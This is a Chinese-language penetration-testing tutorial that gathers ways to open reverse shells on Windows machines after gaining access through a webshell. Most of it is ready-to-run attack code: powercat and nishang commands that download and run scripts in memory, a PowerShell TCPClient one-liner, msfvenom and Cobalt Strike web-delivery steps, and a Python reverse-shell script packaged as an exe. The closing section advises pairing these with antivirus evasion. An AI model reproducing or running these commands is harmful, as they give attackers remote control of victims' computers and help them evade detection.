## 前言

再一次测试过程中，通过webshell拿到了机器权限，本来想着反弹出来一个shell，操作的时候发现机器系统是Win的，因为Win系统遇到的比较少，对它的反弹方式不是太熟悉。后面总结了一下Win下反弹shell的方式，供大家参考。

## 操作环境

攻击机：192.168.56.101 linux

目标机：192.168.56.1 win

## powercat反弹shell(比较常用)

powercat为Powershell版的Netcat，实际上是一个powershell的函数，使用方法类似Netcat

 **使用方式**

攻击者开启监听

攻击者使用nc开启监听7777端口

nc -l 7777

![1692605645_64e31ccdc4fc8d564d35d.png!small?1692605646263](https://image.3001.net/images/20230821/1692605645_64e31ccdc4fc8d564d35d.png!small?1692605646263)

 **由于本人攻击机使用的是linux，因此用 nc进行监听，如果是win也可以使用powercat进行监听。命令如下：powercat -l -p
6666**

 **目标机执行命令进行反弹cmd shell**

    
    
    powershell IEX (New-Object System.Net.Webclient).DownloadString ('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.56.101 -p 7777 -e cmd

通过powershell下载脚本，然后去执行。注意这种方式是没有文件落地的，直接加载进内存去执行。

<https://github.com/besimorhino/powercat>正常访问非常慢，可以下载到本地服务器上，然后访问本地服务器去反弹shell。

![1692605693_64e31cfd4260ac7cc32c1.png!small?1692605693710](https://image.3001.net/images/20230821/1692605693_64e31cfd4260ac7cc32c1.png!small?1692605693710)

  

## nishang反弹shell

Nishang是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可 **反弹TCP/ UDP/
HTTP/HTTPS/ ICMP等类型shell**

项目地址：<https://github.com/samratashok/nishang>

### TCP协议反弹shell

 **使用方式**

攻击者监听端口，同上面的一样，通过nc监听7777端口。

nc -l 7777

目标机器上执行

    
    
    powershell IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com /samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress 192.168.56.101 -port 7777

### UDP协议反弹shell

攻击者监听

攻击者需要监听在udp协议上，如53端口，如下

nc -lvup 53

目标机器上执行

    
    
    powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.101/Invoke-PowerShellUdp.ps1'); Invoke-PowerShellUdp -Reverse -IPAddress 192.168.56.101 -port 53

PS：Invoke-PowerShellUdp.ps1脚本已经下载到本地

### ICMP协议反弹shell

 **这种方式需要两个工具，一个是上面说的nishang脚本下的Invoke-PowerShellIcmp.ps1，另外一个工具用来启动icmp监听。**

icmpsh_m.py：用来在攻击者机器上启动监听，地址：<https://github.com/inquisb/icmpsh>

Invoke-PowerShellIcmp.ps1：目标上执行

利用方式

首先在攻击者机器上下面icmpsh_m.py文件，然后运行下面的命令

python icmpsh_m.py 192.168.56.1 192.168.56.101

![1692605825_64e31d81e2356266c8579.png!small?1692605826544](https://image.3001.net/images/20230821/1692605825_64e31d81e2356266c8579.png!small?1692605826544)

由于这种方式需要安装Impacket library，因此没有测试

目标机上执行

    
    
    powershell IEX (New-Object Net.WebClient).DownloadString('http://192.168.56.101/nishang/Shells/Invoke-PowerShellIcmp.ps1');Invoke-PowerShellIcmp -IPAddress 192.168.159.134

## 自定义powershell函数反弹shell

利用powershell创建一个Net.Sockets.TCPClient对象，通过Socket反弹tcp
shell，这种方式与nishang中的Invoke-PowerShellTcpOneLine.ps1脚本类似

 **攻击者开启监听**

nc -lvp 7777

 **目标机执行**

    
    
    powershell -nop -c "$client = New-Object Net.Sockets.TCPClient('192.168.56.101',7777);$stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){; $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

![1692605927_64e31de748bf7e686827b.png!small?1692605927683](https://image.3001.net/images/20230821/1692605927_64e31de748bf7e686827b.png!small?1692605927683)

  

## MSF反弹

MSF中也继承了一些常见的反弹shell方式，我们可以在MSF中生成payload，然后在目标机器上执行即可，下面是其步骤：

（1）使用 msfvenom -l 结合关键字过滤（如cmd/windows/reverse），找出我们可能需要的payload。

（2）使用msfvenom生成一个powershell类型的木马。

（3）开启监听端口。

（4）目标机在cmd下执行生成的powershell脚本，powershell下执行好像反弹不了

    
    
    msfvenom -l payloads | grep 'cmd/windows/reverse'
    msfvenom -p cmd/windows/reverse_powershell LHOST=192.168.56.101 LPORT=7777
    use exploit/multi/handler
    show options
    set LHOST your-ip
    show options
    run

利用上面的方式会生成一个payload，然后再目标机上执行该脚本即可。

## Cobalt strike反弹shell

Cobalt strike的Scripted Web
Delivery模块，可通过bitsadmin、powershell、python、regsvr32等进行反弹shell，类似metasploit的web_delivery模块

说明：安装Cobalt strike时推荐 java version “1.8.0_121”

 **具体步骤如下**

1)运行服务端

./teamserver 192.168.56.101 passwd #passwd为连接密码

2)运行客户端：

./cobaltstrike #用户名随便输入 密码passwd

3)开启监听:

首先要创建一个Listener, 点击 Cobalt Strike->Listeners ，然后点击Add便可创建Listeners

点击Cobalt Strike->Listeners

payload可选择windows/beacon_http/reverse_http

 **说明：其中windows/beacon 是Cobalt
Strike自带的模块，包括dns,http,https,smb四种方式的监听器，windows/foreign
为外部监听器，即msf或者Armitage的监听器。**

4)生成powershell payload:

点击Attack -> Web Drive-by -> Scripted Web Delivery

Type选择 powershell

5)目标机执行powershell payload:

    
    
    powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.56.101/a'))"

6)成功反弹shell后，右键interact 进入shell

## 通过python反弹shell

如果目标机器上存在python环境，也可以通过执行下面的python脚本来进行反弹shell。

同样，攻击者机器上监听端口：nc -lvvp 7777

目标机器上执行下面的脚本：

    
    
    # -*- coding:utf-8 -*-    import os
    import select
    import socket
    import sys
    import subprocess
    
    def ReserveConnect(addr, port):
        '''反弹连接shell'''
        try:
            shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            shell.connect((addr,port))
        except Exception as reason:
            print ('[-] Failed to Create Socket : %s'%reason)
            exit(0)
        rlist = [shell]
        wlist = []
        elist = [shell]
        while True:
            shell.send("cmd:".encode())
            rs,ws,es = select.select(rlist,wlist,wlist)
            for sockfd in rs:
                if sockfd == shell:
                    command = shell.recv(1024)
                    if command == 'exit':
                        shell.close()
                        break
                    result, error = subprocess.Popen(command,shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()
                    shell.sendall(result.decode("GB2312").encode("UTF-8"))
    
    # 主函数运行
    def run():
        if len(sys.argv)<3:
            print('Usage: python reverse.py [IP] [PORT]')
        else:
            url = sys.argv[1]
            port = int(sys.argv[2])
            ReserveConnect(url,port)
    
    if __name__ == '__main__':
        run()

被攻击端运行命令

python revereshell_win.py 127.0.0.1 7777

攻击端用nc监听，即可反弹cmd。

![1692606402_64e31fc2606d2f007d207.png!small?1692606402780](https://image.3001.net/images/20230821/1692606402_64e31fc2606d2f007d207.png!small?1692606402780)

如果实际应用中没有python环境，也可以将上述脚本打包成exe文件。

使用pyinstaller将改文件打包为exe文件，直接上传exe运行即可。

pythinstaller -Fw revereshell_win.py

## 总结

Win用来执行反弹shell的工具还有很多，上面只是总结常用的几种方式，最常用的就是第一个和第二个，其它的方式例如Empire
结合office反弹shell，dnscat2 反弹DNS
shell等等。在实际应用中你会发现由于大部分机器都装了杀软，因此很多的方式都不能使用，应用上要和免杀结合。

## 参考链接

<https://blog.csdn.net/hackzkaq/article/details/123049915>

<https://blog.csdn.net/qq_39101049/article/details/96191861>

https://www.freebuf.com/articles/web/247967.html

